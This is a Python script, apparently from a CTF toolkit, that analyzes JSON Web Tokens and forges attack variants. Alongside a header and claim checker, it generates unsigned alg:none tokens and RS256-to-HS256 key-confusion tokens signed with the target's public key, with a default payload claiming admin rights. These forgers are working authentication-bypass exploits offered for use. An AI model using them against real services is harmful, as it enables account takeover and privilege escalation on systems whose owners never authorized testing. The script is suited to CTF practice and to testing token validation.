#!/usr/bin/env python3
"""Analyze and generate common JWT CTF test variants.

Consolidated from the V1 JWT algorithm-confusion specialist skill.
Use only against the CTF/authorized target being solved.
"""

import argparse
import base64
import hashlib
import hmac
import json
from datetime import datetime, timezone


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def b64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None
    return {"header": header, "payload": payload, "signature": parts[2]}


def forge_none_alg(payload_dict):
    header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url_encode(json.dumps(payload_dict).encode())
    return f"{header}.{payload}."


def forge_hs256_with_public_key(payload_dict, public_key_pem):
    header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64url_encode(json.dumps(payload_dict).encode())
    signing_input = f"{header}.{payload}".encode()
    key_bytes = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url_encode(signature)}"


def analyze_jwt(token):
    decoded = decode_jwt(token)
    if not decoded:
        return {"error": "Invalid JWT format"}

    findings = []
    header = decoded["header"]
    payload = decoded["payload"]
    alg = str(header.get("alg", ""))

    if alg.lower() == "none":
        findings.append({"issue": "Algorithm set to none", "severity": "critical"})
    if header.get("jwk"):
        findings.append({"issue": "Embedded JWK header is present", "severity": "high"})
    if header.get("jku"):
        findings.append({"issue": f"JKU header: {header['jku']}", "severity": "high"})
    if header.get("x5u"):
        findings.append({"issue": f"X5U header: {header['x5u']}", "severity": "high"})
    if header.get("kid"):
        findings.append({"issue": f"KID header: {header['kid']}", "severity": "medium"})

    exp = payload.get("exp")
    if exp:
        try:
            exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
            if exp_dt < datetime.now(timezone.utc):
                findings.append({"issue": f"Token expired: {exp_dt.isoformat()}", "severity": "low"})
        except (TypeError, ValueError, OSError):
            findings.append({"issue": "Malformed exp claim", "severity": "medium"})
    else:
        findings.append({"issue": "No expiration claim", "severity": "medium"})

    if payload.get("admin") or payload.get("role") in ("admin", "root"):
        findings.append({"issue": "Privileged role/claim appears in payload", "severity": "info"})

    return {
        "header": header,
        "payload": payload,
        "algorithm": alg,
        "findings": findings,
    }


def main():
    parser = argparse.ArgumentParser(description="JWT CTF analyzer / variant generator")
    parser.add_argument("--token", help="JWT token to analyze")
    parser.add_argument("--forge-none", action="store_true", help="Generate an alg:none variant")
    parser.add_argument("--forge-hs256", help="RSA public-key PEM path for RS->HS confusion test")
    parser.add_argument("--payload", help="JSON payload for a generated token")
    parser.add_argument("--output", "-o", help="Write JSON report to this path")
    args = parser.parse_args()

    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "findings": []}

    if args.token:
        analysis = analyze_jwt(args.token)
        report["findings"].append({"type": "analysis", **analysis})

    payload_dict = json.loads(args.payload) if args.payload else {"sub": "admin", "admin": True}

    if args.forge_none:
        report["findings"].append({"type": "forge_none", "token": forge_none_alg(payload_dict)})

    if args.forge_hs256:
        with open(args.forge_hs256, "r", encoding="utf-8") as handle:
            public_key = handle.read()
        report["findings"].append({
            "type": "forge_hs256_confusion",
            "token": forge_hs256_with_public_key(payload_dict, public_key),
        })

    rendered = json.dumps(report, indent=2)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as handle:
            handle.write(rendered + "\n")
    else:
        print(rendered)


if __name__ == "__main__":
    main()
